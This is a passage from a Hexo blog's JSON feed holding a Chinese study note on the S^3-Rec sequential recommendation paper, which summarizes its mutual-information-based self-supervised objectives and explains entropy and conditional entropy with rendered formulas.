{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo • All posts by \"recommendation\" tag",
    "description": "",
    "home_page_url": "https://enjundu.github.io",
    "items": [
        {
            "id": "https://enjundu.github.io/recommendation/Self-Supervised%20Learning%20for%20Sequential%20Recommendation%20with%20Mutual%20Information%20/",
            "url": "https://enjundu.github.io/recommendation/Self-Supervised%20Learning%20for%20Sequential%20Recommendation%20with%20Mutual%20Information%20/",
            "title": "S^3-Rec:Self-Supervised Learning for Sequential Recommendation with Mutual Information Maximization",
            "date_published": "2024-07-29T11:25:31.000Z",
            "content_html": "<h1 id=\"基于互信息最大化的自监督学习序列推荐\"><a class=\"anchor\" href=\"#基于互信息最大化的自监督学习序列推荐\">#</a> 基于互信息最大化的自监督学习序列推荐</h1>\n<h2 id=\"相关知识\"><a class=\"anchor\" href=\"#相关知识\">#</a> 相关知识</h2>\n<ul>\n<li>互信息最大化 (MIM) 原理来学习属性、项目、子序列和序列之间的相关性</li>\n<li>MIM 提供了一种统一的方法来表征不同类型数据之间的相关性</li>\n<li>连续推荐任务</li>\n<li>自注意力机制</li>\n<li>自监督学习</li>\n<li>语言建模</li>\n<li>相互信息最大化</li>\n</ul>\n<h2 id=\"其他文章不足\"><a class=\"anchor\" href=\"#其他文章不足\">#</a> 其他文章不足</h2>\n<p>依赖于项目预测损失来学习整个模型。当加入上下文数据时，所涉及的参数也是通过唯一的优化目标来学习的。研究发现，这种优化方式很容易受到数据稀疏性等问题的困扰</p>\n<h2 id=\"本文内容\"><a class=\"anchor\" href=\"#本文内容\">#</a> 本文内容</h2>\n<ul>\n<li>新颖的自监督学习方法，以改进具有 MIM 的序列推荐</li>\n<li>精心设计了四个自监督优化目标，分别用于捕获项目 - 属性、序列 - 项目、序列 - 属性和序列子序列相关性</li>\n<li>将 MIM 的自监督学习应用于改进顺序推荐任务</li>\n<li>提出了四个自监督优化目标，以最大化不同形式或粒度的上下文信息的互信息</li>\n<li>首次将上下文信息中的相关性视为顺序推荐中的自监督信号。</li>\n</ul>\n<h2 id=\"keywords\"><a class=\"anchor\" href=\"#keywords\">#</a> Keywords</h2>\n<p><strong>自监督学习、顺序推荐、相互信息最大化</strong></p>\n<h2 id=\"大纲\"><a class=\"anchor\" href=\"#大纲\">#</a> 大纲</h2>\n<h4 id=\"模型概述\"><a class=\"anchor\" href=\"#模型概述\">#</a> 模型概述:</h4>\n<ul>\n<li>\n<p><strong>架构:</strong> 基于自注意力神经网络。</p>\n</li>\n<li>\n<p>预训练:</p>\n<p>包含四个辅助自监督学习目标，以改进数据表示：</p>\n<ol>\n<li><strong>关联属性预测 (AAP)</strong></li>\n<li><strong>掩码项预测 (MIP)</strong></li>\n<li><strong>掩码属性预测 (MAP)</strong></li>\n<li><strong>片段预测 (SP)</strong></li>\n</ol>\n</li>\n<li>\n<p><strong>微调:</strong> 使用预训练阶段学到的参数进行推荐任务的微调。</p>\n</li>\n</ul>\n<h4 id=\"自监督学习目标\"><a class=\"anchor\" href=\"#自监督学习目标\">#</a> 自监督学习目标:</h4>\n<ol>\n<li><strong>关联属性预测 (AAP):</strong>\n<ul>\n<li>最大化物品和其属性之间的互信息。</li>\n<li>促进模型学习更好的属性感知的物品表示。</li>\n</ul>\n</li>\n<li><strong>掩码项预测 (MIP):</strong>\n<ul>\n<li>使用双向上下文预测序列中的掩码项。</li>\n<li>增强序列和物品之间的关联。</li>\n</ul>\n</li>\n<li><strong>掩码属性预测 (MAP):</strong>\n<ul>\n<li>使用序列上下文预测掩码项的属性。</li>\n<li>直接融合属性信息和序列上下文。</li>\n</ul>\n</li>\n<li><strong>片段预测 (SP):</strong>\n<ul>\n<li>预测序列中的掩码片段。</li>\n<li>帮助捕捉更稳定的用户偏好。</li>\n</ul>\n</li>\n</ol>\n<h4 id=\"实验\"><a class=\"anchor\" href=\"#实验\">#</a> 实验:</h4>\n<ul>\n<li><strong>数据集:</strong> 在六个不同领域的数据集上进行实验。</li>\n<li><strong>基准:</strong> 与十一种基准模型进行比较。</li>\n<li><strong>评估指标:</strong> 命中率 (HR)，归一化折扣累积增益 (NDCG)，以及平均倒排等级 (MRR)。</li>\n</ul>\n<h4 id=\"结果\"><a class=\"anchor\" href=\"#结果\">#</a> 结果:</h4>\n<ul>\n<li><strong>性能:</strong> S3-Rec 始终优于基准方法。</li>\n<li><strong>消融研究:</strong> 每个自监督目标都对性能提升有贡献。</li>\n<li><strong>广泛适用性:</strong> 自监督学习不仅能改进 S3-Rec，还能改进其他模型。</li>\n<li><strong>数据稀疏:</strong> S3-Rec 即使在训练数据有限的情况下也表现出色。</li>\n<li><strong>收敛速度:</strong> 由于预训练表示的增强，模型收敛速度更快。</li>\n</ul>\n<h4 id=\"结论\"><a class=\"anchor\" href=\"#结论\">#</a> 结论:</h4>\n<ul>\n<li>S3-Rec 利用自监督学习和互信息最大化原则，通过增强数据表示改进序列推荐。</li>\n<li>未来工作包括探索其他形式的自监督优化目标，并将该方法应用于更复杂的推荐任务。</li>\n</ul>\n<h1 id=\"有关概念解释\"><a class=\"anchor\" href=\"#有关概念解释\">#</a> 有关概念解释</h1>\n<h2 id=\"互信息最大化-mim-原理\"><a class=\"anchor\" href=\"#互信息最大化-mim-原理\">#</a> 互信息最大化 (MIM) 原理</h2>\n<h3 id=\"概念介绍\"><a class=\"anchor\" href=\"#概念介绍\">#</a> 概念介绍</h3>\n<p><strong>互信息（Mutual Information, MI）</strong> 是一种用来衡量两个随机变量之间相互依赖程度的度量。互信息可以反映一个随机变量对另一个随机变量的不确定性减少的程度。形式上，互信息<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo separator=\"true\">;</mo><mi>Y</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">I(X;Y)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mpunct\">;</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span></span></span></span> 定义为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>I</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo separator=\"true\">;</mo><mi>Y</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mi mathvariant=\"normal\">∣</mi><mi>Y</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>H</mi><mo stretchy=\"false\">(</mo><mi>Y</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>H</mi><mo stretchy=\"false\">(</mo><mi>Y</mi><mi mathvariant=\"normal\">∣</mi><mi>X</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">I(X;Y)=H(X)-H(X|Y)=H(Y)-H(Y|X)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mpunct\">;</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>其中，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(X)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span></span></span></span> 是随机变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的熵，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mi mathvariant=\"normal\">∣</mi><mi>Y</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(X|Y)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span></span></span></span> 是在给定<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 条件下<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的条件熵。</p>\n<p><strong>互信息最大化</strong> 的基本思想是通过最大化两个变量的互信息来学习数据表示，这可以有效地捕捉数据的内在结构和依赖关系。在机器学习和深度学习中，互信息最大化常用于自监督学习，通过利用数据本身的结构来生成训练信号，而不需要额外的标签数据。</p>\n<h4 id=\"熵\"><a class=\"anchor\" href=\"#熵\">#</a> 熵</h4>\n<p>熵是用于衡量一个随机变量不确定性的度量。对于离散随机变量 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span>, 其熵定义为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi mathvariant=\"script\">X</mi></mrow></munder><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(X)=-\\sum_{x\\in\\mathcal{X}}p(x)\\log p(x)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.3717110000000003em;vertical-align:-1.321706em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8556639999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.14643em;\">X</span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.321706em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">X</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal{X}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.14643em;\">X</span></span></span></span></span> 是随机变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的所有可能取值的集合</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">p(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 是<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 取值为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 的概率</li>\n<li>熵越大表示随机变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的不确定性越高，信息量也就越大</li>\n</ul>\n<h4 id=\"条件熵\"><a class=\"anchor\" href=\"#条件熵\">#</a> 条件熵</h4>\n<p>条件熵是指在已知另一个随机变量 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 已知的情况下，随机变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的不确定性。对于离散随机变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span>，其条件熵定义为:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mi mathvariant=\"normal\">∣</mi><mi>Y</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi mathvariant=\"script\">Y</mi></mrow></munder><mi>p</mi><mo stretchy=\"false\">(</mo><mi>y</mi><mo stretchy=\"false\">)</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi mathvariant=\"script\">X</mi></mrow></munder><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mi mathvariant=\"normal\">∣</mi><mi>y</mi><mo stretchy=\"false\">)</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mi mathvariant=\"normal\">∣</mi><mi>y</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(X|Y)=-\\sum_{y\\in\\mathcal{Y}}p(y)\\sum_{x\\in\\mathcal{X}}p(x|y)\\log p(x|y)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.480449em;vertical-align:-1.430444em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8556639999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.08222em;\">Y</span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.430444em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8556639999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.14643em;\">X</span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.321706em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">X</mi><mtext>和</mtext><mi mathvariant=\"script\">Y</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal{X}和\\mathcal{Y}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.78055em;vertical-align:-0.09722em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.14643em;\">X</span></span><span class=\"mord cjk_fallback\">和</span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.08222em;\">Y</span></span></span></span></span> 分别是随机变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi><mtext>和</mtext><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">X和Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 的所有可能取值的集合</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>y</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">p(y)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span></span></span></span> 是<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 取值为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 的概率</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mi mathvariant=\"normal\">∣</mi><mi>y</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">p(x|y)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span></span></span></span> 是在<span class=\"katex\"><span class=\"katex-mathml\"><math 